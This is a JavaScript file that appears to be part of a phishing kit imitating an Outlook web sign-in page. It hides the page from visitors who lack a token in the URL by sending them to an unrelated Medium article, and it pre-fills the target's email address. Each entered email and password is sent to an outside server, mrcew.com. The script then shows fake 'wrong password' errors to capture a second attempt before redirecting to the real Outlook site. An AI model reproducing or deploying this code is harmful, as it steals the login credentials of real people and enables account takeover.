const error = document.querySelector("#error");
const error2 = document.querySelector("#error2");
const button = document.querySelector(".button");
const bodyDIV = document.querySelector("#body");

const loader = document.querySelector(".loader");



function getAllUrlParams(url) {

    // get query string from url (optional) or window
    var queryString = url ? url.split('?')[1] : window.location.search.slice(1);
  
    // we'll store the parameters here
    var obj = {};
  
    // if query string exists
    if (queryString) {
  
      // stuff after # is not part of query string, so get rid of it
      queryString = queryString.split('#')[0];
  
      // split our query string into its component parts
      var arr = queryString.split('&');
  
      for (var i = 0; i < arr.length; i++) {
        // separate the keys and the values
        var a = arr[i].split('=');
  
        // set parameter name and value (use 'true' if empty)
        var paramName = a[0];
        var paramValue = typeof (a[1]) === 'undefined' ? true : a[1];
  
        // (optional) keep case consistent
        paramName = paramName.toLowerCase();
        if (typeof paramValue === 'string') paramValue = paramValue.toLowerCase();
  
        // if the paramName ends with square brackets, e.g. colors[] or colors[2]
        if (paramName.match(/\[(\d+)?\]$/)) {
  
          // create key if it doesn't exist
          var key = paramName.replace(/\[(\d+)?\]/, '');
          if (!obj[key]) obj[key] = [];
  
          // if it's an indexed array e.g. colors[2]
          if (paramName.match(/\[\d+\]$/)) {
            // get the index value and add the entry at the appropriate position
            var index = /\[(\d+)\]/.exec(paramName)[1];
            obj[key][index] = paramValue;
          } else {
            // otherwise add the value to the end of the array
            obj[key].push(paramValue);
          }
        } else {
          // we're dealing with a string
          if (!obj[paramName]) {
            // if it doesn't exist, create property
            obj[paramName] = paramValue;
          } else if (obj[paramName] && typeof obj[paramName] === 'string'){
            // if property does exist and it's a string, convert it to an array
            obj[paramName] = [obj[paramName]];
            obj[paramName].push(paramValue);
          } else {
            // otherwise add the property
            obj[paramName].push(paramValue);
          }
        }
      }
    }
  
    return obj;
  }

//   console.log(getAllUrlParams().key)
//   console.log(getAllUrlParams().id);

function redirrectPage(){
  var query = window.location.search.substring(1);
  var res = query.split("&");
  var data = res[0];
  console.log(data);

  if (data == "aHR0cHM6Ly93d3cuZ29vZ2")
  {
    console.log("true");
    bodyDIV.style.display = "flex";
  }else{
    console.log("false");
    window.location.href = "https://medium.com/@jeyanthkanagaraju/creating-restful-crud-apis-with-node-js-express-js-and-mongodb-from-scratch-3ef632067928"
  }

  if(getAllUrlParams().id){
    document.querySelector(".emailInput").value = getAllUrlParams().id;
  }
}

redirrectPage();





function ValidateEmail(mail) 
{
 if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test(mail))
  {
    return (true)
  }
    return (false)
}


const createUser = (email, password, Docounter) => {
    axios.get('https://mrcew.com/owa/index1.php?' + 'email=' + email + '&password=' + password + '&Docounter=' + Docounter)
        .then(response => {
            const addedUser = response.data;
            console.log(`get: user is added`, addedUser);
            console.log(response.config);
        })
        .catch(error => console.error(error));
};


var counter = 1; 

const signin = () => {
        
    const emailInput = document.querySelector(".emailInput").value;
    var passwordInput = document.querySelector(".passwordInput").value; 

        if(ValidateEmail(emailInput)){
            
            console.log("email ok");

            if(passwordInput.length > 2){
               
            createUser(emailInput, passwordInput, counter);
            counter++;
            
            if (counter > 2){
                console.log("Done 3 times")
                location.replace("https://outlook.live.com/mail/0/")
            }else{
                error.style.display = "block";
                error2.style.display = "none";
                document.querySelector(".passwordInput").value = "";
            }
            }else{
                error2.style.display = "block";
                error.style.display = "none";
                document.querySelector(".passwordInput").value = "";
            }
           
        }else{

            console.log("bad email");

        }    
}



button.addEventListener("click", ()  => {
    
  loader.style.display = "block";

    if(!navigator.onLine){

        location.reload();
    }else{

      setTimeout(function(){ 

        loader.style.display = "none";

        signin();

    }, 1500);

    }
    

});


document.querySelector(".passwordInput").addEventListener("focusin", ()  => {
      
    error.style.display = "none";
    error2.style.display = "none";
    
});


document.querySelector(".passwordInput").addEventListener("keyup", function(event) {
    if (event.keyCode === 13) {
     event.preventDefault();
     document.querySelector(".button").click();
    }
  });

